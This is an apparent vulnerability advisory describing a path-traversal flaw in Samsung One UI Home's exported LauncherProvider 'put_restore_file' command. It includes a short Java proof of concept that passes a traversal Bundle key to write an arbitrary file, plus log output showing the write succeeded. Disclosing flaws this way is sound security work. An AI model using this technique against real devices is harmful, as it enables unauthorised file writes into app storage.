# Description

Oversecured report:
![](Oversecured_report.png)

The exported `com.android.launcher3.LauncherProvider` method `call()` handled different commands. The `put_restore_file` command checked if the passed `Bundle` key contained `.exml`. In this case this key was used as a relative path, vulnerable to path-traversal, and the byte array value as file contents.

**Proof of Concept**

```java
Bundle bundle = new Bundle();
bundle.putByteArray("../../../../../.exml/../Download/test.txt", "test".getBytes());
getContentResolver().call("com.sec.android.app.launcher.settings", "put_restore_file", "", bundle);
```

After running this code, the One UI Home app displayed the following log:
```
04-11 02:21:15.520  2384  2431 I PutRestoreFileMethod: initDir : /storage/emulated/0/Android/data/com.sec.android.app.launcher/files/.Restore
04-11 02:21:15.529  2384  2431 I PutRestoreFileMethod: ../../../../../.exml/../Download/test.txt filesize: 4
```
